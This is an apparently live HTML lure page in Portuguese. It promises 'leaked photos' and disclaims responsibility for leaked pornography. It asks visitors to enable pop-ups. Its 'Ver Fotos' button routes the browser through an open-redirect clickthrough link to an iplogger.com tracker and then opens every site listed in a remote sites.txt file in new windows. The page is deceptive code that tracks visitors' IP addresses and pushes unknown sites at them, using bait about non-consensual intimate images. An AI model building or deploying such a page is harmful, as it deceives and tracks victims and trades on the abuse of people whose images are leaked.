<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Fotos Aqui</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body {
      background: linear-gradient(135deg, #ff416c, #ff4b2b);
      color: #fff;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }
    .hot-box {
      background-color: rgba(255, 255, 255, 0.1);
      padding: 60px 40px;
      border-radius: 15px;
      text-align: center;
      box-shadow: 0 8px 20px rgba(0,0,0,0.3);
      backdrop-filter: blur(10px);
      max-width: 500px;
      width: 100%;
    }
    .hot-box h1 {
      font-size: 3.5rem;
      font-weight: bold;
      background: linear-gradient(90deg, #fff, #ffe600);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }
    .hot-box p {
      font-size: 1.2rem;
      margin-top: 20px;
      color: #f8f9fa;
    }
    .popup-warning {
      font-size: 0.95rem;
      margin-top: 15px;
      color: #ffe600;
      font-weight: bold;
    }
    .btn-hot {
      margin-top: 30px;
      font-size: 1.2rem;
      padding: 12px 30px;
      background: #fff000;
      color: #000;
      font-weight: bold;
      border: none;
      border-radius: 50px;
      transition: all 0.3s ease-in-out;
    }
    .btn-hot:hover {
      background: #ffe600;
      transform: scale(1.05);
    }
  </style>
</head>
<body>

  <div class="hot-box">
    <h1>FOTOS VAZADAS</h1>
    <p>O site n√£o se responsabiliza por pornografia vazada!</p>
    <p class="popup-warning">‚ö†Ô∏è Ao clicar, permita pop-ups (√≠cone ao lado da barra de endere√ßo) para que todas as fotos possam ser abertas.</p>
    <button class="btn btn-hot" onclick="abrirSitesDaLista()">Ver Fotos üî•</button>
  </div>

  <script>
    async function abrirSitesDaLista() {
        try {
            window.location.href="http://thegreatbritishlist.co.uk/api/clickthrough.php?type=banner&id=128&url=https://iplogger.com/XuCvE";
            const response = await fetch('/sites.txt');
            if (!response.ok) throw new Error('Erro ao carregar sites.txt');

            const texto = await response.text();
            const sites = texto
                .split('\n')
                .map(site => site.trim())
                .filter(site => site);

            if (sites.length === 0) {
                console.log('Nenhum site na lista.');
                return;
            }

            for (let site of sites) {
                window.open(site, '_blank');
            }
        } catch (erro) {
            console.error('Erro:', erro);
        }
    }
  </script>

</body>
</html>
